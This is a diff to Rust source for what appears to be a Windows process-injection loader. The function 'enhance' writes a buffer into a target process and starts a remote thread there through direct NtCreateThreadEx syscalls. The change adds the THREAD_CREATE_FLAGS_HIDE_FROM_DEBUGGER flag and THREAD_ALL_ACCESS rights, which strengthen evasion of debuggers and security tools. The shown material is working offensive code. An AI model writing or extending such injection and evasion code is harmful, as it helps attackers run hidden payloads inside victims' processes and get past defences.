@@ -7,7 +7,7 @@ use rust_syscalls::syscall;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE},
         lmaccess::{ACCESS_ALL}
     },
     shared::{
@@ -16,8 +16,10 @@ use winapi::{
 };
 use winapi::ctypes::c_void;
 use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+use winapi::um::winnt::THREAD_ALL_ACCESS;
 use std::{ptr::null_mut};
 use ntapi::ntapi_base::CLIENT_ID;
+use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
 //use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
 use winapi::shared::ntdef::NULL;
 
@@ -73,7 +75,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
 
-        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, NULL, handle, allocstart, NULL, 0, NULL, NULL, NULL, NULL);
+        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, THREAD_ALL_ACCESS, NULL, handle, allocstart, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0 as usize, 0 as usize, 0 as usize, NULL);
 
         if write_status != 0 {
             panic!("Error failed to create remote thread: {:#02X}", write_thread);
